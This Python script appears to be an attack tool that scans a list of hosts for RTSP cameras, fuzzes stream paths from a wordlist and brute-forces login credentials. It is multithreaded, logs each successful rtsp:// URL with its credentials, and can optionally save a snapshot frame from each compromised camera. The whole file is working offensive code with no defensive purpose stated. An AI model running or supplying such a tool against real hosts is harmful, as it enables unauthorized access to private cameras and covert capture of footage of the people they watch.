#!/usr/bin/env python
"""Brute creds, fuzzing paths for RTSP cams.
See --help for options"""
from concurrent.futures import ThreadPoolExecutor as TPE
from functools import partial
import os
import re
import socket as so
from time import sleep

from fire import Fire

from lib.utils import tim


status_re = re.compile(r'RTSP/\d\.\d (\d\d\d)')

hosts_file = None
rtsp_port = 554
host_threads = 64
path_threads = 2
brute_threads = 1
timeout = 5
verbose = 0
capture_image = False

DIR = os.path.dirname(os.path.abspath(__file__))
LOCAL_DIR = os.path.join(DIR, 'local')
DATA_DIR = os.path.join(DIR, 'data')
CAPTURES_DIR = os.path.join(LOCAL_DIR, 'rtsp_captures')

# cam
C_FOUND = '@'
C_FAKE = '~'

# brute
C_OK = '+'
C_FAIL = '-'

# errors
C_REFUSED = 'x'
C_SLOW = 't'
C_RETRY = 'r'
C_FUC_UP = 'f'
C_NOT_RTSP = '?'
C_TMOF = '%'

C_CAP_OK = 'C'
C_CAP_ERR = '!'


def capture(res):
    from re import sub
    img_name = sub(r'[^A-Za-z0-9]+', '_', res.split('://')[1])
    img_path = os.path.join(CAPTURES_DIR, f'{img_name}.jpg')

    try:
        from cv2 import VideoCapture, imwrite
        from numpy import ndarray
        vcap = VideoCapture(res)
        _, frame = vcap.read()
        if type(frame) != ndarray:
            return False
        else:
            imwrite(img_path, frame)
            return True

    except ImportError:
        import ffmpeg

        stream = ffmpeg.input(res, rtsp_transport='tcp')
        file = stream.output(img_path, vframes=1)

        try:
            file.run(capture_stdout=True, capture_stderr=True)
        except ffmpeg.Error as e:
            print(e.stdout.decode())
            print(e.stderr.decode())
            return False
        else:
            return True


def wrire_result(res: str):
    with open(os.path.join(LOCAL_DIR, 'rtsp.txt'), 'a') as f:
        f.write(f'[{tim()}] {res}\n')
    if capture_image:
        captured = capture(res)
        print(C_CAP_OK if captured else C_CAP_ERR, end='', flush=True)


def rtsp_req(host: str, port: int = 554, path: str = '', cred: str = '', timeout: float = 3):
    if cred:
        cred += '@'
    req = (
        f'DESCRIBE rtsp://{cred}{host}:{port}{path} RTSP/1.0\r\n'
        'CSeq: 2\r\n'
        '\r\n'
    )
    tries = 4
    while True:
        try:
            with so.socket() as s:
                s.settimeout(timeout)
                s.connect((host, port))
                s.sendall(req.encode())
                response = s.recv(1024).decode()
                return int(status_re.findall(response)[0])
        except so.timeout:
            if verbose:
                print(C_SLOW, end='', flush=True)
            break  # slowpoke, 3ff0ff
        except IOError as e:
            # 111 refused
            if e.errno == 111:
                if verbose:
                    print(C_REFUSED, end='', flush=True)

                break

            # 104 reset by peer
            if e.errno == 104:
                if tries <= 0:
                    # print('u', end='', flush=True)
                    if verbose:
                        print(C_FUC_UP, end='', flush=True)
                    break  # host f*ckup?
                sleep(2 / tries)
                tries -= 1
                if verbose > 1:
                    print(C_RETRY, end='', flush=True)
                continue

            # too many open files
            if e.errno == 24:
                sleep(0.15)
                if verbose > 1:
                    print(C_TMOF, end='', flush=True)
                continue
            break

        except KeyboardInterrupt:
            raise
        except IndexError:
            if verbose:
                print(C_NOT_RTSP, end='', flush=True)
            break
        except Exception as e:
            print('Unknown error:', e, 'please, contact with dev')
            return 418
    return 503


def check_cred(host, port, path, cred):
    code = rtsp_req(host, port, path, cred, timeout)
    if code == 200:
        print(C_OK, end='', flush=True)
        return f'rtsp://{cred}@{host}:{port}{path}'

    if code >= 500:
        print(C_FAIL, end='', flush=True)
        return

    return ''


def check_path(host, port, path):
    code = rtsp_req(host, port, path, timeout=timeout)

    if code >= 500:
        print(C_FAIL, end='', flush=True)
        return

    if code not in [200, 401, 403]:
        if verbose == 3:
            print('.', end='', flush=True)
        return ''

    with open(os.path.join(DATA_DIR, 'rtsp_creds.txt')) as f:
        creds = [ln.rstrip() for ln in f]

    ch = partial(check_cred, host, port, path)

    with TPE(brute_threads) as ex:
        for res in ex.map(ch, creds):
            if res is None:
                return
            if res:
                return res


def check_host(host):
    port = rtsp_port
    if ':' in host:
        host, port = host.split(':')
    ch = partial(check_path, host, int(port))

    with TPE(path_threads) as ex:
        with open(os.path.join(DATA_DIR, 'rtsp_paths.txt')) as f:
            paths = [ln.rstrip() for ln in f]

        for rr in ex.map(ch, paths):
            if rr is None:
                return

            if '0h84d' in rr:
                print(C_FAKE, end='', flush=True)  # fake cam
                return

            if rr:
                print(C_FOUND, end='', flush=True)
                wrire_result(rr)
                return rr  # first valid path is enough now


def main(hosts_file=None, port=554, t=5, ht=64, pt=2, bt=1, capture=False, v=False, vv=False, vvv=False):
    """Brute creds, fuzzing paths for RTSP cams

    :param str hosts_file: File with lines ip:port or just ips
    :param int port: Default port to use if not specified in file
    :param int ht: Threads count for hosts
    :param int pt: Threads count for paths
    :param int bt: Threads count for brute
    """
    global rtsp_port
    global verbose
    global host_threads
    global path_threads
    global brute_threads
    global capture_image
    global timeout

    rtsp_port = port
    host_threads = ht
    path_threads = pt
    brute_threads = bt
    capture_image = capture
    timeout = t

    verbose = 3 if vvv else 2 if vv else 1 if v else 0

    if capture and not os.path.exists(CAPTURES_DIR):
        os.mkdir(CAPTURES_DIR)

    if not hosts_file:
        hosts_file = os.path.join(LOCAL_DIR, f'hosts_{rtsp_port}.txt')

    with open(hosts_file) as f:
        hosts = [ln.rstrip() for ln in f]

    with TPE(host_threads) as ex:
        results = ex.map(check_host, hosts)
        for i, res in enumerate(list(results)):
            if res:
                print()
                print(f'[+ {i}]', res)


if __name__ == "__main__":
    Fire(main)
